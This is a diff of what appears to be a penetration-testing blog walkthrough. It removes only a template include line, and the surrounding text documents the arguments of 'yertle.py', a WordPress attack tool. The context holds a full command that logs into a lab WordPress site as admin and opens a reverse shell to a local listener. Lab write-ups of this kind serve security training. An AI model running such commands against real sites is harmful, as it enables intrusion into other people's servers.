@@ -50,7 +50,6 @@ Now we are set lets start..
 
 `Arguments - -t URL, -u username, -p password, -v verbose, -li localhost, -lp localport, -r reverse or -i interactive, -a User Agent.`
 
-{% include codeHeader.html %}
 `python yertle.py -t http://192.168.0.122/wordpress -u admin -p admin -v -li 192.168.0.100 -lp 80 -r`
 
 ![img-description](/images/Yertle-1.png)
